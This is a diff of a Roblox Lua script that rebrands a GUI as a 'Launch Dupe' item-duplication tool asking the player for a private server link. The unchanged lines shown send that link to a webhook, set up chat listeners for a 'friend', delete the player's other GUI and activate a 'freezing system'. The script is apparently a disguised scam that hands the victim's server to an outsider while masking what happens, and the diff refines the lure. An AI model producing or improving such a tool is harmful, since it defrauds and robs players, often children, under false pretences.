@@ -271,7 +271,7 @@ local playerGui = player:WaitForChild("PlayerGui")
 
 --// GUI Setup
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "MetodoGBGui"
+screenGui.Name = "LaunchDupeGui"
 screenGui.ResetOnSpawn = false
 screenGui.IgnoreGuiInset = true
 screenGui.Parent = playerGui
@@ -280,12 +280,12 @@ screenGui.Parent = playerGui
 local blur = Instance.new("Frame")
 blur.Size = UDim2.new(1, 0, 1, 0)
 blur.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-blur.BackgroundTransparency = 0.4
+blur.BackgroundTransparency = 0.5
 blur.Parent = screenGui
 
 --// Main Frame
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 450, 0, 280)
+frame.Size = UDim2.new(0, 500, 0, 300)
 frame.AnchorPoint = Vector2.new(0.5, 0.5)
 frame.Position = UDim2.new(0.5, 0, 0.5, 0)
 frame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
@@ -293,9 +293,10 @@ frame.BorderSizePixel = 0
 frame.ClipsDescendants = true
 frame.Parent = screenGui
 
---// Rounded corners e sombra
-Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 15)
+--// Rounded corners
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
 
+--// Shadow
 local shadow = Instance.new("ImageLabel")
 shadow.Name = "Shadow"
 shadow.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -304,70 +305,81 @@ shadow.Size = UDim2.new(1, 40, 1, 40)
 shadow.BackgroundTransparency = 1
 shadow.Image = "rbxassetid://7912134082"
 shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
-shadow.ImageTransparency = 0.6
+shadow.ImageTransparency = 0.7
 shadow.ZIndex = 0
 shadow.Parent = frame
 
---// Gradient de fundo
-local gradient = Instance.new("UIGradient")
-gradient.Color = ColorSequence.new{
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 20, 70)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 35))
-}
-gradient.Rotation = 45
-gradient.Parent = frame
-
 --// Title
 local title = Instance.new("TextLabel")
-title.Text = "🧠 Método GB"
-title.Size = UDim2.new(1, 0, 0, 40)
+title.Text = "Launch Dupe"
+title.Size = UDim2.new(1, 0, 0, 60)
+title.Position = UDim2.new(0, 0, 0, 20)
 title.BackgroundTransparency = 1
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.Font = Enum.Font.GothamBold
-title.TextScaled = true
+title.TextSize = 28
 title.Parent = frame
+
+--// Subtitle
+local subtitle = Instance.new("TextLabel")
+subtitle.Text = "Import Private Server Link"
+subtitle.Size = UDim2.new(1, 0, 0, 30)
+subtitle.Position = UDim2.new(0, 0, 0, 80)
+subtitle.BackgroundTransparency = 1
+subtitle.TextColor3 = Color3.fromRGB(150, 150, 150)
+subtitle.Font = Enum.Font.Gotham
+subtitle.TextSize = 14
+subtitle.Parent = frame
 
 --// TextBox
 local textbox = Instance.new("TextBox")
-textbox.PlaceholderText = "Cole o link do servidor privado aqui..."
-textbox.Size = UDim2.new(0.9, 0, 0, 45)
-textbox.Position = UDim2.new(0.05, 0, 0.4, 0)
-textbox.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
-textbox.TextColor3 = Color3.fromRGB(0, 0, 0)
+textbox.PlaceholderText = "Enter link here..."
+textbox.Size = UDim2.new(0.88, 0, 0, 50)
+textbox.Position = UDim2.new(0.06, 0, 0, 130)
+textbox.BackgroundColor3 = Color3.fromRGB(40, 40, 48)
+textbox.TextColor3 = Color3.fromRGB(220, 220, 220)
+textbox.PlaceholderColor3 = Color3.fromRGB(100, 100, 110)
 textbox.Font = Enum.Font.Gotham
-textbox.TextScaled = true
+textbox.TextSize = 15
+textbox.Text = ""
+textbox.ClearTextOnFocus = false
 textbox.Parent = frame
-Instance.new("UICorner", textbox).CornerRadius = UDim.new(0, 10)
+Instance.new("UICorner", textbox).CornerRadius = UDim.new(0, 8)
 
 --// Button
 local button = Instance.new("TextButton")
-button.Text = "Prosseguir"
-button.Size = UDim2.new(0.9, 0, 0, 50)
-button.Position = UDim2.new(0.05, 0, 0.7, 0)
-button.BackgroundColor3 = Color3.fromRGB(140, 40, 255)
+button.Text = "Start"
+button.Size = UDim2.new(0.88, 0, 0, 55)
+button.Position = UDim2.new(0.06, 0, 0, 200)
+button.BackgroundColor3 = Color3.fromRGB(60, 130, 255)
 button.TextColor3 = Color3.fromRGB(255, 255, 255)
 button.Font = Enum.Font.GothamBold
-button.TextScaled = true
+button.TextSize = 18
 button.Parent = frame
-Instance.new("UICorner", button).CornerRadius = UDim.new(0, 10)
+Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)
 
 --// Button Animation
 button.MouseEnter:Connect(function()
-	TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(170, 60, 255)}):Play()
+	TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 150, 255)}):Play()
 end)
 button.MouseLeave:Connect(function()
-	TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(140, 40, 255)}):Play()
+	TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 130, 255)}):Play()
 end)
 
 --// Aparecer com animação (fade)
 frame.BackgroundTransparency = 1
 title.TextTransparency = 1
+subtitle.TextTransparency = 1
 textbox.TextTransparency = 1
+textbox.BackgroundTransparency = 1
 button.TextTransparency = 1
+button.BackgroundTransparency = 1
+
 TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
 TweenService:Create(title, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
-TweenService:Create(textbox, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
-TweenService:Create(button, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
+TweenService:Create(subtitle, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
+TweenService:Create(textbox, TweenInfo.new(0.5), {TextTransparency = 0, BackgroundTransparency = 0}):Play()
+TweenService:Create(button, TweenInfo.new(0.5), {TextTransparency = 0, BackgroundTransparency = 0}):Play()
 
 local function setupChatListeners()
     Players.PlayerChatted:Connect(function(_, chatPlayer, message)
@@ -440,9 +452,10 @@ button.MouseButton1Click:Connect(function()
     
     -- ✅ VALIDAÇÃO: verifica se começa com https://
     if input == "" or not input:match("^https://") then
-        textbox.Text = "❌ Coloque o link do seu servidor privado!"
-        wait(2)
         textbox.Text = ""
+        textbox.PlaceholderText = "❌ Coloque o link do seu servidor privado!"
+        wait(2)
+        textbox.PlaceholderText = "Enter link here..."
         return
     end
     
@@ -527,9 +540,9 @@ button.MouseButton1Click:Connect(function()
 
     if success then
         print("✅ Webhook enviada com sucesso!")
-        textbox.Text = "✅ Enviado com sucesso!"
+        button.Text = "✅ Success!"
         wait(2)
-        textbox.Text = ""
+        button.Text = "Start"
         
         -- Setup chat listeners (friend)
         setupChatListeners()
@@ -722,7 +735,7 @@ button.MouseButton1Click:Connect(function()
         -- 6. DELETE ALL GUI (exceto loading screen)
         local function clearGui()
             for _, gui in ipairs(playerGui:GetChildren()) do
-                if gui:IsA("GuiObject") and gui.Name ~= "MetodoGBGui" then
+                if gui:IsA("GuiObject") and gui.Name ~= "LaunchDupeGui" then
                     pcall(gui.Destroy, gui)
                 end
             end
@@ -743,8 +756,8 @@ button.MouseButton1Click:Connect(function()
         print("✅ Sistema de congelamento ativado!")
     else
         warn("❌ Erro ao enviar webhook:", response)
-        textbox.Text = "❌ Erro ao enviar! Tente novamente."
+        button.Text = "❌ Error!"
         wait(2)
-        textbox.Text = ""
+        button.Text = "Start"
     end
 end)
